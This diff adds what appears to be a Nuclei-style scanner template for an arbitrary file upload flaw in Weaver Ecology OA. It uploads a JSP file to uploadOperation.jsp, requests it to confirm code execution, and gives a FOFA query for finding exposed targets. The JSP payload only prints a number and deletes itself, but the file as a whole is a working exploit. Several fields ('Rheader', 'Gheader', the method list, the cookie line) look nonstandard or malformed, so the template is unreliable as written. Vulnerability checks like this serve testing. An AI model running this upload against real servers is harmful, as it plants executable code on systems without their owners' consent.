@@ -1,0 +1,46 @@
+id: ecology-arbitrary文件上传
+
+info:
+  name: Ecology - Arbitrary File Upload
+  author: ritikchaddha
+  severity: critical
+  description: 包含一个任意文件上传漏洞。攻击者可以将任意文件上传到服务器，从而使应用程序将文件内容作为代码执行
+  reference: mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+  metadata:
+    max-request: 2
+    fofa-query: app="泛微-协同办公OA"
+  tags: ecology,upload,fileupload,intrusive
+
+http:   
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/page/exportImport/uploadOperation.jsp"
+      - "{{BaseURL}}/page/exportImport/fileTransfer/123.jsp"
+    body:
+      - |
+        ------WebKitFormBoundaryFy3iNVBftjP6IOwo
+        Content-Disposition: form-data; name="file"; filename="123.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.print(364536*876356);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
+    Rheader:
+      - Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+    Gheader:
+      - Cookie:session & Content-Type:application/x-www-form-urlencoded & Accept-Encoding:deflate
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "319463310816"
+        
+      - type: status
+        status:
+          - 200
+
+# Enhanced by md on 2022/10/31
